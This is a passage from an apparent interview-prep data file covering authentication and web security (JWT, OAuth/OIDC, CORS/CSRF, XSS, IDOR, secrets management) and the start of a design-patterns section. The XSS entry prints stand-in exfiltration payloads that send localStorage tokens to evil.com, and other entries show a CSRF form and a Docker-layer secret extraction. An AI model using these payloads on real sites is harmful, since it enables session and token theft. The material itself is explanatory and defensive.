On logout: increment tokenVersion to 6
→ All existing tokens with version 5 become invalid</pre>
<div class="key-point">The practical approach: short-lived access tokens (5 min) + revocable server-side refresh tokens. Immediate logout everywhere needs a revocation store (Redis blacklist or token versioning).</div>`,
      },
      {
        q: 'What is the difference between OAuth 2.0 and JWT?',
        difficulty: 'medium',
        a: `<div class="interview-answer"><p>This is a category error dressed up as a comparison: OAuth 2.0 is an authorization framework — a set of flows for granting delegated access — while a JWT is just a token format, a signed JSON container. They're not alternatives, they compose. OAuth defines how a client obtains a token; JWT is one popular format that token can take, since OAuth access tokens can equally be opaque random strings the auth server looks up. So you often use both: run the OAuth authorization-code flow and receive a JWT access token. The mistake is thinking you choose one over the other, or that using JWTs means you've implemented OAuth — you haven't.</p></div>
<ul>
<li><strong>OAuth 2.0</strong>: an <strong>authorization framework</strong> that defines flows for granting access. It specifies WHO can access WHAT.</li>
<li><strong>JWT</strong>: a <strong>token format</strong> that encodes claims as JSON. It's a container, not a protocol.</li>
</ul>
<pre>OAuth 2.0 can use different token formats:
  - JWT (self-contained, no DB lookup needed)
  - Opaque tokens (random string, server must look up)

JWT can be used outside OAuth:
  - Session replacement in your own auth system
  - API key alternative
  - Service-to-service authentication

// Typical combination:
OAuth 2.0 Authorization Server → issues JWT access tokens
Resource Server → validates JWT without calling auth server</pre>
<div class="key-point">OAuth 2.0 is the "process" (how to get a token). JWT is the "envelope" (what the token looks like). They're complementary, not competing.</div>`,
      },
      {
        q: 'What is OpenID Connect and how is it related to OAuth 2.0?',
        difficulty: 'medium',
        a: `<div class="interview-answer"><p>OIDC is the thin identity layer OAuth was missing. OAuth 2.0 only answers "is this app authorized to access these resources" — it deliberately says nothing about who the user is, and people dangerously bolted authentication onto it anyway. OIDC standardizes that: on top of the OAuth flow it adds an <code>id_token</code> (a JWT with standard identity claims like <code>sub</code>, <code>email</code>, <code>iss</code>, <code>aud</code>) and a userinfo endpoint. So the model is OAuth for authorization via the access token, OIDC for authentication via the ID token. It's what "Sign in with Google" actually uses. The gotcha is confusing the two tokens — the access token calls APIs, the ID token proves who logged in and shouldn't be sent to resource APIs.</p></div>
<p><strong>OpenID Connect (OIDC)</strong> is an identity layer built ON TOP of OAuth 2.0.</p>
<pre>OAuth 2.0 alone:
  "This app can access your Google Drive photos"
  → Authorization (access to resources)
  → Doesn't tell you WHO the user is

OIDC adds:
  "The user is john@gmail.com, their name is John Doe"
  → Authentication (identity verification)
  → Returns an ID Token (JWT) with user info

// OIDC flow:
1. App redirects to Google: scope=openid email profile
2. User logs in on Google
3. Google returns:
   - Access Token (OAuth): for API access
   - ID Token (OIDC): JWT with user identity
   - Refresh Token: for renewing access

// ID Token payload:
{
  "iss": "https://accounts.google.com",
  "sub": "1234567890",        // unique user ID
  "email": "john@gmail.com",
  "name": "John Doe",
  "picture": "https://...",
  "exp": 1699999999
}</pre>
<div class="key-point">When someone says "Login with Google/GitHub/Microsoft", that's OIDC in action. OAuth 2.0 handles the authorization, OIDC adds the user identity on top.</div>`,
      },
      {
        q: 'What is the difference between RBAC and ABAC?',
        difficulty: 'medium',
        a: `<div class="interview-answer"><p>RBAC grants permissions through roles — admin, editor, viewer — and it's simple, auditable, and enough for most apps; ABAC decides per request by evaluating attributes of the user, resource, action, and environment, like ownership, department, time, or IP. The tradeoff is expressiveness vs complexity: RBAC is easy to reason about but suffers role explosion when you need fine-grained or contextual rules, while ABAC handles those elegantly but is harder to author, test, and audit. In practice I start with RBAC and layer attribute checks onto the cases roles can't express — most real systems are hybrid. The gotcha with ABAC is that a complex policy engine becomes its own correctness and performance risk.</p></div>
<ul>
<li><strong>RBAC (Role-Based Access Control)</strong>: permissions granted based on user's role.</li>
<li><strong>ABAC (Attribute-Based Access Control)</strong>: permissions based on attributes of user, resource, environment.</li>
</ul>
<pre>// RBAC: simple role checks
if (user.role === "ADMIN") → allow DELETE /users
if (user.role === "EDITOR") → allow PUT /articles
if (user.role === "VIEWER") → allow GET /articles

// ABAC: attribute-based rules (more flexible)
ALLOW if:
  user.department === resource.department AND
  user.clearanceLevel >= resource.sensitivityLevel AND
  currentTime is within businessHours AND
  request.ipAddress is in allowedNetwork

// Example:
"A doctor can view patient records ONLY in their own department,
 ONLY during working hours, ONLY from hospital network"
→ RBAC can't express this easily, ABAC can</pre>
<table><tr><th>Aspect</th><th>RBAC</th><th>ABAC</th></tr>
<tr><td>Complexity</td><td>Simple</td><td>Complex</td></tr>
<tr><td>Granularity</td><td>Coarse (role-level)</td><td>Fine (attribute-level)</td></tr>
<tr><td>Scalability</td><td>Role explosion risk</td><td>Scales with policies</td></tr>
<tr><td>Best for</td><td>Most web apps</td><td>Healthcare, finance, government</td></tr></table>
<div class="key-point">Start with RBAC for most applications. Move to ABAC when you need rules like "users can only edit their own department's documents during business hours."</div>`,
      },
      {
        q: 'What is the difference between CORS and CSRF?',
        difficulty: 'medium',
        a: `<div class="interview-answer"><p>They sound alike but are nearly opposites. CORS is a browser mechanism that relaxes the same-origin policy — a server saying "these other origins may read my responses" — so it's about permitting cross-origin reads, not a defense. CSRF is an attack where a malicious site rides your logged-in cookies to make a state-changing request you didn't intend. The common misconception is that CORS prevents CSRF; it doesn't — CORS governs reading responses, while CSRF abuses the request being sent with your credentials. You stop CSRF with <code>SameSite</code> cookies, anti-CSRF tokens, and checking Origin/Referer. And loosening CORS to <code>*</code> just to clear an error is how people accidentally open real holes.</p></div>
<p>Two completely different security concepts that are often confused:</p>
<ul>
<li><strong>CORS (Cross-Origin Resource Sharing)</strong>: A browser security <strong>mechanism</strong> that controls which origins can make requests to your API.</li>
<li><strong>CSRF (Cross-Site Request Forgery)</strong>: An <strong>attack</strong> where a malicious site tricks a user's browser into making unwanted requests to your API.</li>
</ul>
<pre>// CORS: browser blocks cross-origin requests by default
// Your app: https://myapp.com
// Your API: https://api.myapp.com
// Browser: "Different origin! Block unless API says it's OK"

// Server response headers:
Access-Control-Allow-Origin: https://myapp.com
Access-Control-Allow-Methods: GET, POST, PUT
Access-Control-Allow-Headers: Authorization, Content-Type

// CSRF attack:
// 1. User is logged into bank.com (has session cookie)
// 2. User visits evil.com
// 3. evil.com has: &lt;form action="bank.com/transfer" method="POST"&gt;
// 4. Browser automatically includes bank.com cookies → transfer happens!

// CSRF protection:
// - SameSite cookies (SameSite=Strict or Lax)
// - CSRF tokens (random token in form, verified server-side)
// - Check Origin/Referer headers</pre>
<div class="key-point">CORS is a protection mechanism (allow/block). CSRF is an attack pattern (exploit). CORS alone does NOT prevent CSRF. You need SameSite cookies or CSRF tokens.</div>`,
      },
      {
        q: 'What is XSS and why does it matter for token-based auth?',
        difficulty: 'hard',
        a: `<div class="interview-answer"><p>XSS is when an attacker gets their JavaScript to run in your page's origin, which means it can do anything your code can — read the DOM, make authenticated requests, and steal any token reachable from JS. That's the argument against localStorage for tokens: XSS drains it instantly, whereas an HttpOnly cookie is at least invisible to script. Note that XSS still beats HttpOnly cookies indirectly, because the script can just make requests as the user. The real fix is prevention, not storage tricks: contextual output encoding, treating all input as untrusted, a strict Content-Security-Policy, and framework auto-escaping. Stored, reflected, and DOM-based XSS all reduce to the same root — untrusted data reaching an execution sink.</p></div>
<p><strong>XSS (Cross-Site Scripting)</strong>: An attacker injects malicious JavaScript that runs in your page with full access to everything the page can access.</p>
<pre>// Three types:
1. Stored XSS: malicious script saved in DB, served to all users
   Comment: &lt;script&gt;fetch('evil.com?token='+localStorage.getItem('jwt'))&lt;/script&gt;

2. Reflected XSS: malicious script in URL parameter
   https://myapp.com/search?q=&lt;script&gt;alert('hacked')&lt;/script&gt;

3. DOM-based XSS: script manipulates DOM unsafely
   document.innerHTML = userInput;  // DANGEROUS!</pre>
<p><strong>Impact on auth:</strong></p>
<pre>// If token is in localStorage:
localStorage.getItem('accessToken')  // attacker reads it!
fetch('https://evil.com/steal?token=' + token)  // sends to attacker

// If token is in HttpOnly cookie:
document.cookie  // can't read HttpOnly cookies ✅
// BUT attacker can still make requests AS the user from the page</pre>
<p><strong>Prevention:</strong></p>
<ul>
<li><strong>Output encoding</strong>: escape user content before rendering in HTML</li>
<li><strong>CSP headers</strong>: <code>Content-Security-Policy: script-src 'self'</code></li>
<li><strong>Framework safe rendering</strong>: React auto-escapes by default, Angular sanitizes</li>
<li><strong>Never use</strong>: <code>innerHTML</code>, <code>dangerouslySetInnerHTML</code>, <code>eval()</code> with user input</li>
</ul>
<div class="key-point">Even with HttpOnly cookies, XSS can act AS the user (make API calls, change data). XSS prevention is critical regardless of token storage strategy.</div>`,
      },
      {
        q: 'What is mTLS and when would you use it between services?',
        difficulty: 'hard',
        a: `<div class="interview-answer"><p>Regular TLS authenticates only the server; mTLS makes both sides present certificates, so the server also cryptographically verifies the client. In microservices that gives strong service-to-service identity and wire encryption without passing shared secrets around — service A knows it's really talking to service B, which underpins zero-trust networking. The natural place is internal east-west traffic, usually terminated automatically by a service mesh so app code never touches certs. The operational catch is certificate lifecycle — issuance, rotation, revocation at scale — which is exactly why you lean on a mesh or SPIFFE/SPIRE rather than hand-rolling it. It's overkill for public user traffic, where OAuth tokens fit better.</p></div>
<p><strong>mTLS (Mutual TLS)</strong> means both client and server verify each other's identity using certificates — not just the server (regular TLS).</p>
<pre>Regular TLS (HTTPS):
  Client → verifies server certificate → encrypted connection
  Server doesn't verify client identity

mTLS:
  Client → verifies server certificate ✅
  Server → verifies client certificate ✅
  Both sides know who they're talking to</pre>
<p><strong>How it works:</strong></p>
<ol>
<li>Each service has its own certificate signed by a trusted CA</li>
<li>On connection: server presents cert → client verifies</li>
<li>Client presents cert → server verifies</li>
<li>Both verified → encrypted communication established</li>
</ol>
<p><strong>When to use:</strong></p>
<ul>
<li>Service-to-service communication in microservices (zero-trust network)</li>
<li>API access for trusted partners (banking, healthcare)</li>
<li>IoT device authentication</li>
</ul>
<pre>// Common setup: service mesh handles mTLS automatically
// Istio/Linkerd inject sidecar proxies that handle certificates
// No code changes needed in your services</pre>
<div class="key-point">JWT proves user context (who is the user). mTLS proves service identity (which service is calling). They solve different problems and are often used together: mTLS between services + JWT for user context.</div>`,
      },
      {
        q: 'What is the difference between symmetric and asymmetric JWT signing?',
        difficulty: 'hard',
        a: `<div class="interview-answer"><p>Symmetric (HS256) signs and verifies with one shared secret; asymmetric (RS256, ES256) signs with a private key and verifies with a public key. The deciding factor is who needs to verify: if the same service issues and validates, HS256 is simpler and faster. But the moment multiple services — or third parties — must verify tokens, asymmetric wins decisively, because you hand out the public key freely while only the auth server holds the private key, so a compromised verifier can't mint tokens. It's also what enables JWKS and key rotation by <code>kid</code>. The classic pitfall is the algorithm-confusion attack when you accept both: an attacker signs an HS256 token using your public key as the secret, so always pin the algorithm.</p></div>
<table style="width:100%;border-collapse:collapse;margin:10px 0;font-size:.88rem;">
<tr><th style="text-align:left;padding:6px;border-bottom:1px solid #ccc;">Aspect</th><th style="padding:6px;border-bottom:1px solid #ccc;">Symmetric (HS256)</th><th style="padding:6px;border-bottom:1px solid #ccc;">Asymmetric (RS256)</th></tr>
<tr><td style="padding:6px;">Keys</td><td style="padding:6px;">One shared secret</td><td style="padding:6px;">Private key + Public key</td></tr>
<tr><td style="padding:6px;">Sign</td><td style="padding:6px;">Same secret</td><td style="padding:6px;">Private key (auth server only)</td></tr>
<tr><td style="padding:6px;">Verify</td><td style="padding:6px;">Same secret</td><td style="padding:6px;">Public key (anyone can verify)</td></tr>
<tr><td style="padding:6px;">Secret distribution</td><td style="padding:6px;">Must share secret with all verifiers</td><td style="padding:6px;">Only public key shared (safe)</td></tr>
</table>
<pre>// Symmetric (HS256): one secret for both signing and verifying
HMACSHA256(payload, "my-shared-secret")
// Every service that verifies tokens needs the secret → security risk

// Asymmetric (RS256): separate keys
Sign with PRIVATE key (only auth server has this)
Verify with PUBLIC key (published at /.well-known/jwks.json)
// Any service can verify without knowing the signing key!

// JWKS endpoint:
GET https://auth.myapp.com/.well-known/jwks.json
→ { "keys": [{ "kty": "RSA", "n": "...", "e": "AQAB" }] }</pre>
<div class="key-point">Use asymmetric (RS256/ES256) when many services need to verify tokens but only one authority should sign. This is the standard approach for microservices and third-party auth providers.</div>`,
      },
      {
        q: 'How do you protect login endpoints from brute-force attacks?',
        difficulty: 'medium',
        a: `<div class="interview-answer"><p>I defend in layers, because no single control is enough. Rate limiting and progressive delays or lockouts slow password guessing, but keyed carefully — per-account plus per-IP, since credential stuffing spreads attempts across many accounts and IPs to dodge per-account limits. A CAPTCHA after a few failures raises the cost for bots. The biggest structural win is not relying on passwords alone: MFA, plus checking credentials against known-breach lists to block stuffing outright. Passwords must be stored with a slow hash like bcrypt or Argon2 so a leak isn't instantly crackable, and I return a generic "invalid credentials" so I don't leak which accounts exist. The gotcha is account lockout becoming a denial-of-service vector against legitimate users.</p></div>
<p>Login endpoints are prime targets for brute-force and credential stuffing attacks.</p>
<p><strong>Defense layers:</strong></p>
<ul>
<li><strong>Rate limiting</strong>: Max 5 attempts per account per 15 minutes</li>
<li><strong>Progressive delays</strong>: Increase response time after each failure (1s, 2s, 4s...)</li>
<li><strong>Account lockout with auto-unlock</strong>: Lock for 15 min after 10 failures (not permanent — that's a DoS vector)</li>
<li><strong>CAPTCHA</strong>: After 3 failures, require CAPTCHA</li>
<li><strong>MFA</strong>: Even if password is compromised, attacker needs second factor</li>
<li><strong>Password hashing</strong>: bcrypt/argon2 with high cost factor (makes each attempt slow)</li>
<li><strong>Monitor & alert</strong>: Detect credential stuffing patterns (many accounts, few attempts each)</li>
</ul>
<pre>// Rate limiting with Redis:
String key = "login:" + username + ":" + ip;
int attempts = redis.incr(key);
redis.expire(key, 900); // 15 min window

if (attempts > 5) {
    return Response.status(429)
        .header("Retry-After", "900")
        .body("Too many attempts. Try again in 15 minutes.");
}

// Password hashing (bcrypt):
String hash = BCrypt.hashpw(password, BCrypt.gensalt(12));
// 12 rounds → ~250ms per hash → brute force is impractical</pre>
<div class="key-point">Do not rely on account lockout alone — attackers can lock out legitimate users (denial of service). Combine rate limiting + progressive delays + MFA for robust protection.</div>`,
      },
      {
        q: 'How does refresh token rotation with reuse detection work?',
        difficulty: 'tricky',
        a: `<div class="interview-answer"><p>Rotation makes every refresh token single-use: each refresh returns a new refresh token and invalidates the old one. The clever part is reuse detection — because tokens are one-time, if an already-used old token shows up again that's a strong signal it was stolen and someone is replaying a consumed token. The response is to revoke the entire token family/session and force re-authentication, which caps how long a stolen refresh token stays useful. You track this with a token-family ID and a used/rotated flag server-side. The gotcha is false positives from races — a network retry or two tabs refreshing at once can look like reuse — so you need a small grace window or careful client handling to avoid logging honest users out.</p></div>
<p><strong>Refresh token rotation</strong> means every refresh token is <strong>one-time use</strong>: each time the client refreshes, the server issues a NEW refresh token and invalidates the old one. The senior-level part is <strong>reuse detection</strong> — what happens when an already-used token shows up again.</p>
<pre>// Normal flow (rotation):
Client                        Server
  |-- POST /refresh (RT1) -->  |  RT1 valid → mark RT1 used
  |&lt;-- AT2 + RT2 ------------  |  issue new pair, same "family" F
  |-- POST /refresh (RT2) -->  |  RT2 valid → mark RT2 used
  |&lt;-- AT3 + RT3 ------------  |

// Theft scenario (reuse detection):
Attacker steals RT2 and uses it first:
  Attacker -- /refresh (RT2) --> server → OK, issues RT3' to attacker
  Victim   -- /refresh (RT2) --> server → RT2 ALREADY USED!
  → This is impossible in normal operation
  → Someone has a stolen copy → REVOKE THE ENTIRE FAMILY F
  → Both attacker's RT3' and victim's tokens are dead
  → Victim re-authenticates; attacker is locked out</pre>
<pre>// Server-side model:
refresh_tokens table:
  id | family_id | user_id | status (active|used|revoked) | expires_at

async function refresh(token) {
  const row = await db.findRefreshToken(hash(token));
  if (!row) throw new AuthError(401);

  if (row.status !== 'active') {
    // Reuse detected → nuke the whole family
    await db.revokeFamily(row.family_id);
    alertSecurityTeam(row.user_id);
    throw new AuthError(401);
  }
  await db.markUsed(row.id);
  return issueNewPair(row.user_id, row.family_id); // same family
}</pre>
<p><strong>Why revoke the whole family?</strong> After reuse you cannot tell which party (victim or attacker) holds the "current" token — the attacker may have refreshed first and now owns the newest one. Killing the family is the only safe move.</p>
<p><strong>Interviewer follow-ups:</strong> race conditions (a legitimate client retrying a timed-out refresh looks like reuse — allow a small grace window or make refresh idempotent per token), storing only <strong>hashes</strong> of refresh tokens, and binding the family to device/IP fingerprints for alerting.</p>
<div class="key-point">Rotation limits the blast radius of a stolen refresh token; reuse detection turns the stolen token into a tripwire — one replay and the entire token family is revoked.</div>`,
      },
      {
        q: 'Why should you NOT use JWT for user sessions? When does JWT actually win?',
        difficulty: 'tricky',
        a: `<div class="interview-answer"><p>For classic browser sessions a plain server-side session — a random opaque ID in an HttpOnly cookie, state in Redis — is usually the better choice, and reaching for JWT by default is a common junior mistake. Sessions are trivially revocable (delete the row), you can update permissions instantly, the cookie is tiny, and you're not shipping readable, hard-to-invalidate user data around. JWT's headline benefit, stateless with no lookup, is exactly what makes revocation and logout painful, and most apps hit Redis every request anyway. Where JWT genuinely wins is stateless cross-service or third-party authorization, mobile and API clients, and federated SSO — cases where a central session store is a bottleneck or the verifier isn't the issuer. Match the tool to that, not to hype.</p></div>
<p>This contrarian question separates seniors from tutorial-followers. JWT is often the <strong>wrong</strong> tool for classic browser sessions:</p>
<ul>
<li><strong>You can't revoke it</strong>: logout, password change, "ban this user now" — the token stays valid until <code>exp</code>. Every fix (blacklist in Redis, token versioning) reintroduces the server-side state JWT was supposed to eliminate.</li>
<li><strong>Payload bloat</strong>: roles, permissions, profile data get stuffed in; the token is sent on EVERY request. A 4 KB JWT vs a 32-byte session ID on every call adds up.</li>
<li><strong>Stale claims</strong>: role changes don't take effect until the token expires — admin demoted at 10:00 is still admin until 10:15.</li>
<li><strong>Clock skew</strong>: <code>exp</code>/<code>nbf</code> checks across servers with drifting clocks cause mysterious intermittent 401s (mitigate with a small leeway).</li>
<li><strong>Logout is a lie</strong>: deleting the cookie client-side doesn't invalidate the token an attacker already copied.</li>
</ul>
<pre>// Stateful session — boring and correct for one web app:
// Cookie: sessionId=abc123 (HttpOnly, Secure, SameSite)
const session = await redis.get('sess:' + sessionId);
// Logout?    redis.del('sess:' + sessionId)  → dead INSTANTLY
// Ban user?  delete all their sessions       → done
// Lookup cost: ~0.2ms Redis GET — almost never your bottleneck

// JWT "logout" in comparison:
// option A: wait for exp (user is "logged out" but token works)
// option B: Redis blacklist checked on every request
//           → congratulations, you rebuilt session storage</pre>
<p><strong>When JWT genuinely wins:</strong></p>
<ul>
<li><strong>Cross-service auth</strong>: service B verifies a token issued by auth server A with just the public key — no shared session store, no network hop.</li>
<li><strong>Short-lived access tokens</strong> (5–15 min) paired with revocable server-side refresh tokens — the standard OAuth2 pattern.</li>
<li><strong>Stateless one-shot grants</strong>: signed download links, email verification, password reset tokens.</li>
</ul>
<div class="key-point">For a single web app, a session ID in an HttpOnly cookie + Redis is simpler and instantly revocable. JWT earns its complexity only for short-lived, cross-service credentials — "stateless" just means the state problem moved, not disappeared.</div>`,
      },
      {
        q: 'What is IDOR (Insecure Direct Object Reference) and how do you prevent it?',
        difficulty: 'hard',
        a: `<div class="interview-answer"><p>IDOR is broken access control at the object level: you expose an object reference like an ID and then forget to check that the authenticated user is authorized for that specific object — so changing <code>/invoice/123</code> to <code>124</code> returns someone else's invoice. It's topped the OWASP list for years because it's trivially easy to introduce: authentication passes, so people assume authorization did too. The fix is an ownership/authorization check on every object access, server-side, scoped to the current user — never trust the ID from the client. Unguessable UUIDs are defense in depth, not a fix, since it's still a missing check. The real discipline is centralizing that check so nobody forgets it on a new endpoint.</p></div>
<p><strong>IDOR</strong> is when an application exposes a direct reference to an internal object (an ID) and fails to check that the <em>authenticated</em> user is <em>authorized</em> for that specific object. It has topped the OWASP list (as Broken Access Control) for years because it's trivially easy to introduce.</p>
<pre>// The attack — no tools needed, just curiosity:
GET /api/orders/123   → my order. Logged in, token valid. 200 OK
GET /api/orders/124   → someone ELSE's order... also 200 OK!

// The vulnerable code — authentication ≠ authorization:
app.get('/api/orders/:id', requireAuth, async (req, res) => {
  const order = await db.query(
    'SELECT * FROM orders WHERE id = ?', [req.params.id]
  ); // ← checked WHO you are, never WHAT you may see
  res.json(order);
});</pre>
<pre>// The fix: ownership is part of EVERY query, not an afterthought
app.get('/api/orders/:id', requireAuth, async (req, res) => {
  const order = await db.query(
    'SELECT * FROM orders WHERE id = ? AND user_id = ?',
    [req.params.id, req.user.id]   // ← scope to current user
  );
  if (!order) return res.sendStatus(404); // don't leak existence
  res.json(order);
});

// Even better: make it impossible to forget
class OrderRepository {
  findForUser(orderId, userId) {   // no "find(orderId)" exists
    return db.query('... WHERE id = ? AND user_id = ?',
                    [orderId, userId]);
  }
}</pre>
<p><strong>Why "hide the button in the UI" fails:</strong> the UI is not a security boundary — attackers use curl, not your React app. The check must live in the data-access path on the server.</p>
<p><strong>Defense in depth:</strong></p>
<ul>
<li>Scope every query/repository method by owner or tenant — centralize it so a developer can't forget.</li>
<li>Return <code>404</code> (not <code>403</code>) for objects the user can't see, so IDs can't be enumerated.</li>
<li>Use UUIDs instead of sequential IDs — but only as an obscurity layer, <strong>never</strong> as the fix.</li>
<li>Write authorization tests: "user A requests user B's resource → 404".</li>
</ul>
<div class="key-point">Authentication answers "who are you?"; authorization answers "may YOU touch THIS object?" — IDOR happens whenever the second check is missing, and the only real fix is an ownership predicate in every data access.</div>`,
      },
      {
        q: 'How do you store and manage application secrets properly?',
        difficulty: 'hard',
        a: `<div class="interview-answer"><p>The core principle is that secrets never live in code or the repo — that's how they end up in Git history and leaked forever. The progression: hardcoded is worst; env vars and config files are better but still sit in plaintext on disk and leak via logs and process dumps; the right answer is a dedicated secrets manager (Vault, AWS Secrets Manager) that stores them encrypted, gates access by policy, audits reads, and supports rotation. Beyond storage, what matters is automatic rotation, short-lived dynamic credentials, and encryption in transit and at rest. In Kubernetes, native Secrets are only base64 by default, so you back them with a real KMS. And you scan commits so a leaked key is caught and rotated immediately.</p></div>
<p>Secrets (DB passwords, API keys, signing keys) leak through predictable paths, and each naive storage level fails differently:</p>
<ul>
<li><strong>Hardcoded in source</strong>: lives forever in git history — rotating the secret doesn't scrub old commits; one leaked repo leaks everything.</li>
<li><strong>.env files</strong>: fine locally, but they get committed by accident, copied to laptops, and pasted into Slack. No audit trail, no rotation.</li>
<li><strong>Plain env vars in production</strong>: visible via <code>docker inspect</code>, <code>/proc/&lt;pid&gt;/environ</code>, crash dumps, and often echoed into logs by debug tooling.</li>
</ul>
<pre># The Docker image layer trap — a classic senior gotcha:
FROM node:20
COPY .env .          # layer 3 now contains the secret
RUN rm .env          # layer 4 "deletes" it...
# ...but layers are immutable! Anyone with the image runs:
#   docker save app | tar -x && cat */layer.tar
# and reads the secret from layer 3. Same trap:
ARG DB_PASSWORD      # build args are baked into image history
# → docker history --no-trunc shows it</pre>
<pre>// The right pattern: fetch at runtime from a secret manager
// (Vault, AWS Secrets Manager, GCP Secret Manager, Azure Key Vault)
import { SecretsManagerClient, GetSecretValueCommand }
  from '@aws-sdk/client-secrets-manager';

const client = new SecretsManagerClient({});
// No secret in code, image, or env — the pod's IAM role/service
// account is the identity; the manager checks it and audits access.
const res = await client.send(new GetSecretValueCommand({
  SecretId: 'prod/payment-service/db',
}));
const { password } = JSON.parse(res.SecretString);</pre>
<p><strong>What a real secrets setup gives you:</strong></p>
<ul>
<li><strong>Rotation</strong>: secrets change on a schedule (or on incident) without redeploys; apps re-fetch or receive new leases. Design for rotation from day one — retrofit is painful.</li>
<li><strong>Least privilege</strong>: each service can read only its own secrets; a compromised pod doesn't leak the whole vault.</li>
<li><strong>Audit log</strong>: who read which secret when — essential for incident response.</li>
<li><strong>Dynamic secrets</strong> (Vault): short-lived, per-instance DB credentials that expire on their own — the strongest option.</li>
</ul>
<p><strong>Interviewer follow-ups:</strong> how does the app authenticate to the secret manager without... a secret? (Answer: platform identity — IAM roles, Kubernetes service accounts, instance metadata.) And: add pre-commit scanning (gitleaks, trufflehog) because someone WILL commit a key eventually.</p>
<div class="key-point">Secrets should exist only in a dedicated manager with identity-based access, rotation, and audit — never in code, git history, Docker layers, or long-lived env files; assume anything that touched git or an image layer is already leaked.</div>`,
      },
    ],
  },

  // ========================= DESIGN PATTERNS =========================,
  {
    id: 'design-patterns',
    name: 'Design Patterns',
    icon: '🧩',
    questions: [
      {
        q: 'What is a design pattern and why does it matter?',
        difficulty: 'easy',
        a: `<div class="interview-answer"><p>A design pattern is a named, reusable solution to a recurring design problem — and the emphasis I put on it is that patterns are shared vocabulary as much as solutions. Saying "let's use a Strategy here" communicates a whole design in two words to anyone who knows the catalog. But the senior caveat is that patterns are tools, not goals: each one buys flexibility by adding indirection, and indirection costs readability, so applying them speculatively (pattern-itis) makes code worse. I reach for a pattern when a real force — change, variation, coupling — actually shows up, not preemptively. Knowing when NOT to use one is the mark of maturity.</p></div>
<p>A <strong>design pattern</strong> is a reusable solution to a recurring design problem.</p>
<ul>
<li>It gives a shared vocabulary.</li>
<li>It improves maintainability when used appropriately.</li>
<li>It is not a rule to force everywhere.</li>
</ul>
<pre>// Example: same interface, different implementations
interface NotificationSender {
    void send(String message);
}

class EmailSender implements NotificationSender {
    public void send(String message) {
        System.out.println("Email: " + message);
    }
}

class SmsSender implements NotificationSender {
    public void send(String message) {
        System.out.println("SMS: " + message);
    }
}</pre>
<div class="key-point">Patterns are tools, not goals. Overusing them can make simple code harder to understand.</div>`,
      },
      {
        q: 'What is the Singleton pattern and what are its risks?',
        difficulty: 'medium',
        a: `<div class="interview-answer"><p>Singleton guarantees one instance with a global access point, and it's the pattern I'm most suspicious of. The mechanics have real gotchas — thread safety on lazy init (double-checked locking with <code>volatile</code>, or better, an enum or holder idiom in Java) and being broken via reflection or serialization. But the deeper problem is design: a singleton is global mutable state, which hides dependencies, couples everything to a concrete class, and makes unit testing painful because you can't substitute it. So my take is that most singletons should just be a single instance managed by your DI container and injected as a dependency — you get "one instance" without the global-access baggage.</p></div>
<p><strong>Singleton</strong> ensures only one instance of a class exists.</p>
<ul>
<li>Useful for shared configuration or one-off coordinators.</li>
<li>Risks: hidden global state, hard testing, tight coupling.</li>
</ul>
<pre>// Enum-based Singleton in Java
public enum AppConfig {
    INSTANCE;

    private final String env = "prod";

    public String getEnv() {
        return env;
    }
}

// Usage:
String env = AppConfig.INSTANCE.getEnv();</pre>
<div class="key-point">In Java, enum-based singleton is the safest common implementation.</div>`,
      },
      {
        q: 'What is the Factory Method pattern?',
        difficulty: 'medium',
        a: `<div class="interview-answer"><p>Factory Method moves object creation behind a method, often overridden by subclasses, so callers depend on an interface rather than a concrete class — you can swap or extend what's created without touching client code, which is Open/Closed in action. I use it when the exact type to instantiate depends on context or subclass, or when I want to centralize and name creation logic that a bare <code>new</code> can't express, and it also helps testing. The thing to keep straight is scope: Factory Method creates one product via inheritance, whereas Abstract Factory creates families of related products via composition — people blur the two constantly.</p></div>
<p><strong>Factory Method</strong> delegates object creation to a method instead of calling constructors directly everywhere.</p>
<pre>interface PaymentGateway {
    void pay(int amount);
}

class StripeGateway implements PaymentGateway {
    public void pay(int amount) {
        System.out.println("Paid by Stripe: " + amount);
    }
}

class PaypalGateway implements PaymentGateway {
    public void pay(int amount) {
        System.out.println("Paid by PayPal: " + amount);
    }
}

class PaymentGatewayFactory {
    public PaymentGateway create(String type) {
        if ("stripe".equalsIgnoreCase(type)) return new StripeGateway();
        if ("paypal".equalsIgnoreCase(type)) return new PaypalGateway();
        throw new IllegalArgumentException("Unknown type");
    }
}</pre>
<div class="key-point">Use it when creation logic varies and you want calling code to depend on abstractions.</div>`,
      },
      {
        q: 'What is the difference between Factory Method and Abstract Factory?',
        difficulty: 'medium',
        a: `<div class="interview-answer"><p>Both hide construction behind an abstraction, but at different scopes and via different mechanisms. Factory Method is about one product and uses inheritance — a subclass overrides the creator method to decide the concrete type. Abstract Factory is about a family of related products and uses composition — you inject a factory object whose methods produce a matched set, like a WindowsButton and WindowsCheckbox versus the Mac equivalents, guaranteeing consistency. My rule of thumb: reach for Abstract Factory when multiple product types must vary together as a set, and Factory Method when it's a single product whose type varies. In practice an Abstract Factory's methods are often themselves Factory Methods, which is why people conflate them.</p></div>
<ul>
<li><strong>Factory Method</strong>: creates one product type.</li>
<li><strong>Abstract Factory</strong>: creates a family of related products.</li>
</ul>
<pre>interface Button {
    void render();
}

interface Dialog {
    void open();
}

class LightButton implements Button {
    public void render() { System.out.println("Light Button"); }
}

class LightDialog implements Dialog {
    public void open() { System.out.println("Light Dialog"); }
}

interface UiFactory {
    Button createButton();
    Dialog createDialog();
}

class LightUiFactory implements UiFactory {
    public Button createButton() { return new LightButton(); }
    public Dialog createDialog() { return new LightDialog(); }
}</pre>
<div class="key-point">Abstract Factory is useful when several objects must match, such as a theme-specific button, dialog, and input.</div>`,
      },
      {
        q: 'What is the Builder pattern and why is it useful?',
        difficulty: 'easy',
        a: `<div class="interview-answer"><p>Builder is my go-to when a constructor has too many parameters, especially optional ones — it kills the telescoping-constructor mess and the unreadable <code>new Thing(null, null, true, null)</code> call sites. You get named, fluent, self-documenting construction, can enforce validation in <code>build()</code>, and it pairs beautifully with immutability: assemble step by step, then produce a final immutable object. In Java the Effective-Java static-nested Builder is the canonical form. I'd use it over setters precisely because setters leave objects mutable and half-constructed. The gotcha is applying it to simple objects where it's pure ceremony — a two-field class doesn't need a builder.</p></div>
<p><strong>Builder</strong> constructs complex objects step by step.</p>
<ul>
<li>Improves readability.</li>
<li>Avoids long constructors with many optional arguments.</li>
<li>Works well for immutable objects.</li>
</ul>
<pre>class User {
    private final String name;
    private final String email;
    private final String role;

    private User(Builder builder) {
        this.name = builder.name;
        this.email = builder.email;
        this.role = builder.role;
    }

    public static class Builder {
        private String name;
        private String email;
        private String role = "USER";

